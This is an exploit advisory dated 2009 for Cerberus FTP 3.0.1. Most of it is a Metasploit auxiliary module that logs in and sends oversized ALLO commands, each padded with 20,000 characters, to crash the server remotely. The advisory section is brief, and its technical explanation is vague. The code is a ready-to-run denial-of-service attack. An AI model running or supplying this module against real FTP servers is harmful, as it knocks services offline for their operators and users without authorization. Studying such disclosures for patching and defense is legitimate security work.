Cerberus FTP 3.0.1 (ALLO) Remote Overflow DoS Exploit (meta)
============================================================


#####################################################################################

Application:  Cerberus FTP 3.0.1
            
Platforms:    Windows XP Professional SP2

crash:	      N/A
	
Exploitation: remote DoS

Date:         2009-08-24

Author:       Francis Provencher (Protek Research Lab&#039;s)
             

#####################################################################################

1) Introduction
2) Technical details
3) The Code


#####################################################################################

===============
1) Introduction

===============
Cerberus FTP Server is a secure and easy-to-use professional Windows FTP server featuring FIPS 140-2 certified encryption.

#####################################################################################

============================
2) Technical details 
============================

The validation of some ftp commands are not made by the server. This lead to a a DoS.... 



#####################################################################################

===========
3) The Code
===========

Proof of concept DoS code;

require &#039;msf/core&#039;

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ftp
	include Msf::Auxiliary::Dos
	
	def initialize(info = {})
		super(update_info(info,	
			&#039;Name&#039;           => &#039;Cerberus FTP command ALLO overflow&#039;,
			&#039;Description&#039;    => %q{
				 You need to have a valid login
				so you can run ALLO command.
			},
			&#039;Author&#039;         => &#039;Francis Provencher "Protek Research Lab&#039;s",
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;1&#039;,
			&#039;References&#039;     =>
				
			&#039;DisclosureDate&#039; => &#039;Aug 24 2009&#039;))

		# They&#039;re required
		register_options([
			OptString.new(&#039;FTPUSER&#039;, [ true, &#039;Valid FTP username&#039;, &#039;anonymous&#039; ]),
			OptString.new(&#039;FTPPASS&#039;, [ true, &#039;Valid FTP password for username&#039;, &#039;anonymous&#039; ])
		])
	end

	def run
		return unless connect_login

		print_status("Sending commands...")

		# We want to try to wait for responses to these
		raw_send("ALLO #{&#039;A&#039; * 20000}\r\n")
		raw_send("ALLO #{&#039;A&#039; * 20000}\r\n")

		disconnect
	end
end


#####################################################################################




